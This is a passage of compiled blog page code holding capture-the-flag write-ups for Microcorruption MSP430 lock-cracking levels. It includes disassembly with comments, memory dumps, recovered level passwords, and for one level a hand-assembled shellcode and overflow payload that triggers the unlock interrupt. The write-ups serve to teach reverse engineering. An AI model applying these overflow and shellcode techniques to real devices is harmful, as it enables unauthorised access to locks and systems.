<span class="line"><span style="color:#FFA198;font-style:italic">451e:</span><span style="color:#E6EDF3">  3d40 </span><span style="color:#79C0FF">6400</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x64</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r13</span><span style="color:#E6EDF3">         </span></span>
<span class="line"><span style="color:#79C0FF">4522</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0e43</span><span style="color:#E6EDF3">           clr	</span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#79C0FF">4524</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4528</span><span style="color:#E6EDF3">:  b012 f045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45f0</span><span style="color:#E6EDF3"> &#x3C;memset>    </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452c:</span><span style="color:#E6EDF3">  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">452e:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">4644</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4446</span><span style="color:#E6EDF3"> &#x3C;conditional_unlock_door></span></span>
<span class="line"><span style="color:#79C0FF">4532</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4534</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0324</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x8</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x48</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#79C0FF">4536</span><span style="color:#E6EDF3">:  3f40 c544      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44c5</span><span style="color:#E6EDF3"> "Access granted.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453a:</span><span style="color:#E6EDF3">  023c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x6</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x4c</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">453c:</span><span style="color:#E6EDF3">  3f40 d544      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d5</span><span style="color:#E6EDF3"> "That password is </span><span style="color:#FF7B72">not</span><span style="color:#E6EDF3"> correct.", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4540</span><span style="color:#E6EDF3">:  b012 b045      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x45b0</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4544</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#79C0FF"> 1000</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x10</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#79C0FF">4548</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3041</span><span style="color:#FF7B72">           ret</span></span></code></pre>`);var p=a(o,6);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>445c:  3012 7e00      push	#0x7e</span></span>
<span class="line"><span>4460:  b012 3245      call	#0x4532 &#x3C;INT></span></span>
<span class="line"><span></span></span></code></pre>`);var t=a(p,4);n(t,()=>'<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>shellcode: 3012 7f00 b012 4c45</span></span></code></pre>');var r=a(t,6);n(r,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>43e0: 6045 0300 d445 0000 0a00 0000 4445 aaaa</span></span>
<span class="line"><span>43f0: aaaa aaaa aaaa aaaa aaaa aaaa aabc de00</span></span>
<span class="line"><span>4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40</span></span></code></pre>`);var c=a(r,6);n(c,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>      16         +      16          +  4    = 36</span></span>
<span class="line"><span>30127f00b0124c45 + 0000000000000000 + ee43  = 30127f00b0124c450000000000000000ee43</span></span></code></pre>`);var y=a(c,6);n(y,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FF7B72">xor</span><span style="color:#79C0FF"> r15</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">          ; clear out r15</span></span>
<span class="line"><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3"> #</span><span style="color:#79C0FF">0xffff</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">      ; set r15 to max </span></span>
<span class="line"><span style="color:#FF7B72">sub</span><span style="color:#E6EDF3"> #</span><span style="color:#79C0FF">0xff80</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">      ; subtract 0xffff - 0xff80 = 0x007f without any zeros in assembled code</span></span>
<span class="line"><span style="color:#FF7B72">push</span><span style="color:#79C0FF"> r15</span><span style="color:#8B949E">              ; put on stack</span></span>
<span class="line"><span style="color:#FF7B72">call</span><span style="color:#E6EDF3"> #</span><span style="color:#79C0FF">0x454c</span><span style="color:#8B949E">          ; call interrupt</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D2A8FF">shellcode:</span><span style="color:#E6EDF3"> 0fef3f40ffff3f8080ff0f12b0124c45</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">                   len(</span><span style="color:#79C0FF">32</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#D2A8FF">payload:</span><span style="color:#E6EDF3"> 0fef3f40ffff3f80ff800f12b0124c45 + ee43 = 0fef3f40ffff3f80ff800f12b0124c45ee43</span></span></code></pre>`),S(2),g(e,s)}const va=Object.freeze(Object.defineProperty({__proto__:null,default:Qs,metadata:Ks},Symbol.toStringTag,{value:"Module"})),Zs={title:"Microcorruption New Orleans",date:"2025-02-01T00:00:00",description:"The process and solution for the first Microcorruption level",categories:["microcorruption","reversing","pwn"]};var Xs=B('<p>Microcorruption is a embedded ctf website. Upon entry we are greeted with the following description.</p> <blockquote><p>Scattered throughout the world in locked warehouses are briefcases filled with Cy Yombinator bearer bonds that could be worth billions comma billions of dollars. You will help steal the briefcases.</p> <p>Cy Yombinator has cleverly protected the warehouses with Lockitall electronic lock devices. Lockitall locks are unlockable with an app. We’ve positioned operatives near each warehouse; each is waiting for you to successfully unlock the warehouse by tricking out the locks.</p> <p>The Lockitall devices work by accepting Bluetooth connections from the Lockitall LockIT Pro app. We’ve done the hard work for you: we spent $15,000 on a development kit that includes remote controlled locks for you to practice on, and reverse engineered enough of it to build a primitive debugger.</p> <p>Using the debugger, you’ll be able to single step the lock code, set breakpoints, and examine memory on your own test instance of the lock. You’ll use the debugger to find an input that unlocks the test lock, and then replay it to a real lock.</p> <p>Should be a milk run. Good luck. We’ll see you on a beach in St Tropez once you’re done.</p></blockquote> <p>Once we select the New Orleans task we are greeted by our debugging window:</p> <p><img src="/images/9ni4inaetni4dfadsf.png" alt="Picture of the debugging window"></p> <p>Checking out the main function, we see that it is getting a password (get_password) and then calling a function check_passwd. If check_password sets r15 to 1, then we jump to unlock the door.</p> <!> <p>The get_password function is relatively standard:</p> <!> <p>The check_password function is a little more interesting. I have added comments about what it is doing. This disassembler seems to follow what I call the AT&T method as instructions are structured: src -> dest.</p> <!> <p>As we can see r15 is our return register and we need to find a way to ensure check_password is true. Fortunately, we are also given access to a memory dump. Since, we know we are comparing the data at 2400 to our input we can just look and memory to find this data.</p> <!> <p>As you can see there is a clear password in memory:</p> <p><code>&#125;(Uco]0</code></p> <p>Using this password we can solve this challenge.</p>',1);function sa(e){var s=Xs(),l=a(b(s),10);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4438</span><span style="color:#E6EDF3"> &#x3C;main></span></span>
<span class="line"><span style="color:#79C0FF">4438</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#E6EDF3"> 9cff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xff9c</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">443c:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">7e44</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x447e</span><span style="color:#E6EDF3"> &#x3C;create_password></span></span>
<span class="line"><span style="color:#79C0FF">4440</span><span style="color:#E6EDF3">:  3f40 e444      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44e4</span><span style="color:#E6EDF3"> "</span><span style="color:#FF7B72">Enter</span><span style="color:#E6EDF3"> the password to continue", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4444</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">9445</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4594</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4448</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444a:</span><span style="color:#E6EDF3">  b012 b244      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44b2</span><span style="color:#E6EDF3"> &#x3C;get_password></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444e:</span><span style="color:#E6EDF3">  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4450</span><span style="color:#E6EDF3">:  b012 bc44      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44bc</span><span style="color:#E6EDF3"> &#x3C;check_password></span></span>
<span class="line"><span style="color:#79C0FF">4454</span><span style="color:#E6EDF3">:  0f93           tst	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4456</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">0520</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span><span style="color:#E6EDF3"> &#x3C;main+</span><span style="color:#79C0FF">0x2a</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#79C0FF">4458</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0345</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4503</span><span style="color:#E6EDF3"> "Invalid password</span><span style="color:#8B949E">; try again.", r15</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">445c:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">9445</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4594</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#79C0FF">4460</span><span style="color:#E6EDF3">:  063c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xe</span><span style="color:#E6EDF3"> &#x3C;main+</span><span style="color:#79C0FF">0x36</span><span style="color:#E6EDF3">></span></span>
<span class="line"><span style="color:#79C0FF">4462</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">2045</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4520</span><span style="color:#E6EDF3"> "Access Granted!", </span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4466</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">9445</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4594</span><span style="color:#E6EDF3"> &#x3C;puts></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">446a:</span><span style="color:#E6EDF3">  b012 d644      </span><span style="color:#FF7B72">call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x44d6</span><span style="color:#E6EDF3"> &#x3C;unlock_door></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">446e:</span><span style="color:#E6EDF3">  0f43           clr	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#79C0FF">4470</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3150</span><span style="color:#79C0FF"> 6400</span><span style="color:#FF7B72">      add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x64</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">44b2 &#x3C;get_password></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44b2:</span><span style="color:#79C0FF">  3e40</span><span style="color:#79C0FF"> 6400</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x64</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44b6:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">8445</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4584</span><span style="color:#E6EDF3"> &#x3C;getsn></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44ba:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span></span></code></pre>`);var p=a(o,4);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#E6EDF3">44bc &#x3C;check_password></span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44bc:</span><span style="color:#79C0FF">  0e43</span><span style="color:#E6EDF3">           clr	</span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">                            ; r14 = 0</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44be:</span><span style="color:#E6EDF3">  0d4f           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	r15</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r13</span><span style="color:#8B949E">                       ; move r15 (current address of user input on stack) into r13</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44c0:</span><span style="color:#E6EDF3">  0d5e           </span><span style="color:#FF7B72">add</span><span style="color:#79C0FF">	r14</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r13</span><span style="color:#8B949E">                       ; r14 is an offset, add this offset to user input</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44c2:</span><span style="color:#E6EDF3">  ee9d </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      cmp</span><span style="color:#E6EDF3">.b	@</span><span style="color:#79C0FF">r13</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">r14</span><span style="color:#E6EDF3">)              </span><span style="color:#8B949E">; check data at memory address 2400 + offset, to user input + offset</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44c6:</span><span style="color:#79C0FF">  0520</span><span style="color:#FF7B72">           jnz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xc</span><span style="color:#E6EDF3"> &#x3C;check_password+</span><span style="color:#79C0FF">0x16</span><span style="color:#E6EDF3">>    </span><span style="color:#8B949E">; if not equal, jump to check_password + 12 or 44c8</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44c8:</span><span style="color:#79C0FF">  1e53</span><span style="color:#FF7B72">           inc</span><span style="color:#79C0FF">	r14</span><span style="color:#8B949E">                            ; add 1 to r14</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44ca:</span><span style="color:#79C0FF">  3e92</span><span style="color:#FF7B72">           cmp</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x8</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">                      ; compare r14 with 8 (important to note we do this check after inc so our input needs to be 7 characters long)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44cc:</span><span style="color:#E6EDF3">  f823           </span><span style="color:#FF7B72">jnz</span><span style="color:#E6EDF3">	$-</span><span style="color:#79C0FF">0xe</span><span style="color:#E6EDF3"> &#x3C;check_password+</span><span style="color:#79C0FF">0x2</span><span style="color:#E6EDF3">>     </span><span style="color:#8B949E">; its not 8 then jump to 44be (repeat without clearing r14)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44ce:</span><span style="color:#E6EDF3">  1f43           </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x1</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                      ; if r14 is 8 set r15 to True (1) </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44d0:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                                      ; return</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44d2:</span><span style="color:#E6EDF3">  0f43           clr	</span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                            ; if something else happened, set r15 to False (0)</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">44d4:</span><span style="color:#79C0FF">  3041</span><span style="color:#FF7B72">           ret</span><span style="color:#8B949E">                                      ; return</span></span></code></pre>`);var t=a(p,4);n(t,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>0000: 0000 4400 0000 0000 0000 0000 0000 0000   ..D.............</span></span>
<span class="line"><span>0010: 3041 0000 0000 0000 0000 0000 0000 0000   0A..............</span></span>
<span class="line"><span>0020: 0000 0000 0000 0000 0000 0000 0000 0000   ................</span></span>
<span class="line"><span>0030: *  </span></span>
<span class="line"><span>0150: 0000 0000 0000 0000 0000 0000 085a 0000   .............Z..</span></span>
<span class="line"><span>0160: 0000 0000 0000 0000 0000 0000 0000 0000   ................</span></span>
<span class="line"><span>0170: *  </span></span>
<span class="line"><span>2400: 7d28 5563 6f5d 3000 0000 0000 0000 0000   &#125;(Uco]0.........</span></span>
<span class="line"><span>2410: 0000 0000 0000 0000 0000 0000 0000 0000   ................</span></span>
<span class="line"><span>2420: *  </span></span>
<span class="line"><span>4380: 0000 0000 0000 0000 0000 0000 4445 0000   ............DE.</span></span></code></pre>`),S(6),g(e,s)}const Aa=Object.freeze(Object.defineProperty({__proto__:null,default:sa,metadata:Zs},Symbol.toStringTag,{value:"Module"})),aa={title:"Microcorruption Reykjavik",date:"2025-02-07T10:00:00",description:"The process and solution for the fifth Microcorruption level",categories:["microcorruption","reversing","pwn"]};var na=B('<p>As always here is the manual for Microcorruption:</p> <ul><li>Manual: <a href="https://microcorruption.com/public/manual.pdf" rel="nofollow">https://microcorruption.com/public/manual.pdf</a></li></ul> <p>Additionally, the MSP430 specific booklets:</p> <ul><li>User Guide: <a href="https://www.ti.com/lit/ug/slau049f/slau049f.pdf" rel="nofollow">https://www.ti.com/lit/ug/slau049f/slau049f.pdf</a></li> <li>ABI: <a href="https://www.ti.com/lit/an/slaa534a/slaa534a.pdf" rel="nofollow">https://www.ti.com/lit/an/slaa534a/slaa534a.pdf</a></li></ul> <p>On first glance at the main function it looks like we are doing something to at the address 2400 and the calling a function there.</p> <!> <p>adding a breakpoint at 444a, and then checking the memory at 2400 we are left with the following</p> <!> <p>Using the provided disassembler: <a href="https://microcorruption.com/assembler" rel="nofollow">https://microcorruption.com/assembler</a></p> <p>we find the following code, which I have cleaned up a little bit:</p> <!> <p>So it looks like this code is printing the string “what’s the password?” one character at a time and then checking if the password begins with <code>0cc6</code>. The important part is below:</p> <!> <p>Simply entering 0cc6 solves this problem.</p>',1);function la(e){var s=na(),l=a(b(s),10);n(l,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">4438</span><span style="color:#E6EDF3"> &#x3C;main></span></span>
<span class="line"><span style="color:#79C0FF">4438</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 2045</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4520</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">     ; ?</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">443c:</span><span style="color:#E6EDF3">  0f4e           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	r14</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">         ; ?</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">443e:</span><span style="color:#79C0FF">  3e40</span><span style="color:#E6EDF3"> f800      </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xf8</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span><span style="color:#8B949E">       ; ?</span></span>
<span class="line"><span style="color:#79C0FF">4442</span><span style="color:#E6EDF3">:  3f40 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">     ; r15, I assume address to place function</span></span>
<span class="line"><span style="color:#79C0FF">4446</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">8644</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4486</span><span style="color:#E6EDF3"> &#x3C;enc>    </span><span style="color:#8B949E">; long function which I would like to ignore </span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444a:</span><span style="color:#E6EDF3">  b012 </span><span style="color:#79C0FF">0024</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#8B949E">          ; call a function at 2400</span></span>
<span class="line"><span style="color:#FFA198;font-style:italic">444e:</span><span style="color:#E6EDF3">  0f43           clr	</span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">              ; r15 the return factor (return 0)</span></span></code></pre>`);var o=a(l,4);n(o,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>0b12 0412 0441 2452 3150 e0ff 3b40 2045 </span></span>
<span class="line"><span>073c 1b53 8f11 0f12 0312 b012 6424 2152 </span></span>
<span class="line"><span>6f4b 4f93 f623 3012 0a00 0312 b012 6424 </span></span>
<span class="line"><span>2152 3012 1f00 3f40 dcff 0f54 0f12 2312  </span></span>
<span class="line"><span>b012 6424 3150 0600 b490 0cc6 dcff 0520  </span></span>
<span class="line"><span>3012 7f00 b012 6424 2153 3150 2000 3441  </span></span>
<span class="line"><span>3b41 3041 1e41 0200 0212 0f4e 8f10 024f  </span></span>
<span class="line"><span>32d0 0080 b012 1000 3241 3041 d21a 189a  </span></span>
<span class="line"><span>22dc 45b9 4279 2d55 858e a4a2 67d7 14ae   </span></span>
<span class="line"><span>a119 76f6 42cb 1c04 0efa a61b 74a7 416b   </span></span>
<span class="line"><span>d237 a253 22e4 66af c1a5 938b 8971 9b88 </span></span>
<span class="line"><span>fa9b 6674 4e21 2a6b b143 9151 3dcc a6f5 </span></span>
<span class="line"><span>daa7 db3f 8d3c 4d18 4736 dfa6 459a 2461   </span></span>
<span class="line"><span>921d 3291 14e6 8157 b0fe 2ddd 400b 8688 </span></span>
<span class="line"><span>6310 3ab3 612b 0bd9 483f 4e04 5870 4c38 </span></span>
<span class="line"><span>c93c ff36 0e01 7f3e fa55 aeef 051c 242c </span></span>
<span class="line"><span>3c56 13af e57b 8abf 3040 c537 656e 8278 </span></span>
<span class="line"><span>9af9 9d02 be83 b38c e181 3ad8 395a fce3  </span></span>
<span class="line"><span>4f03 8ec9 9395 4a15 ce3b fd1e 7779 c9c3  </span></span>
<span class="line"><span>5ff2 3dc7 5953 8826 d0b5 d9f8 639e e970   </span></span>
<span class="line"><span>01cd 2119 ca6a d12c 97e2 7538 96c5 8f28   </span></span>
<span class="line"><span>d682 1be5 ab20 7389 48aa 1fa3 472f a564 </span></span>
<span class="line"><span>de2d b710 9081 5205 8d44 cff4 bc2e 577a </span></span>
<span class="line"><span>d5f4 a851 c243 277d a4ca 1e6b</span></span></code></pre>`);var p=a(o,6);n(p,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#79C0FF">2400</span><span style="color:#E6EDF3">: &#x3C;main2></span></span>
<span class="line"><span style="color:#E6EDF3">0b12           </span><span style="color:#FF7B72">push</span><span style="color:#79C0FF">	r11</span><span style="color:#E6EDF3">                  </span></span>
<span class="line"><span style="color:#79C0FF">0412</span><span style="color:#FF7B72">           push</span><span style="color:#E6EDF3">	r4                  </span></span>
<span class="line"><span style="color:#79C0FF">0441</span><span style="color:#FF7B72">           mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, r4               </span></span>
<span class="line"><span style="color:#79C0FF">2452</span><span style="color:#FF7B72">           add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">, r4             </span></span>
<span class="line"><span style="color:#79C0FF">3150</span><span style="color:#E6EDF3"> e0ff      </span><span style="color:#FF7B72">add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0xffe0</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span><span style="color:#E6EDF3">               </span></span>
<span class="line"><span style="color:#E6EDF3">3b40 </span><span style="color:#79C0FF">2045</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4520</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r11</span><span style="color:#8B949E">              ; looking in memory 0x4520 is the string "what's the password?"</span></span>
<span class="line"><span style="color:#E6EDF3">073c           </span><span style="color:#FF7B72">jmp</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0x10</span><span style="color:#8B949E">                    ; jump to test_at_end</span></span>
<span class="line"><span style="color:#D2A8FF">print_char:</span></span>
<span class="line"><span style="color:#E6EDF3">1b53           </span><span style="color:#FF7B72">inc</span><span style="color:#79C0FF">	r11</span></span>
<span class="line"><span style="color:#E6EDF3">8f11           sxt	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#E6EDF3">0f12           </span><span style="color:#FF7B72">push</span><span style="color:#79C0FF">	r15</span></span>
<span class="line"><span style="color:#79C0FF">0312</span><span style="color:#FF7B72">           push</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x0</span><span style="color:#8B949E">                      ; take one argument putchar INT</span></span>
<span class="line"><span style="color:#E6EDF3">b012 </span><span style="color:#79C0FF">6424</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2464</span><span style="color:#E6EDF3"> &#x3C;</span><span style="color:#FF7B72">INT</span><span style="color:#E6EDF3">>      </span></span>
<span class="line"><span style="color:#D2A8FF">test_at_end:</span></span>
<span class="line"><span style="color:#79C0FF">2152</span><span style="color:#FF7B72">           add</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">sp</span></span>
<span class="line"><span style="color:#E6EDF3">6f4b           </span><span style="color:#FF7B72">mov</span><span style="color:#E6EDF3">.b	@</span><span style="color:#79C0FF">r11</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span><span style="color:#8B949E">                 ; check if at end of what's the password?</span></span>
<span class="line"><span style="color:#E6EDF3">4f93           tst.b	</span><span style="color:#79C0FF">r15</span></span>
<span class="line"><span style="color:#E6EDF3">f623           </span><span style="color:#FF7B72">jnz</span><span style="color:#E6EDF3">	$-</span><span style="color:#79C0FF">0x12</span><span style="color:#8B949E">                    ; jump to print_char if not at end </span></span>
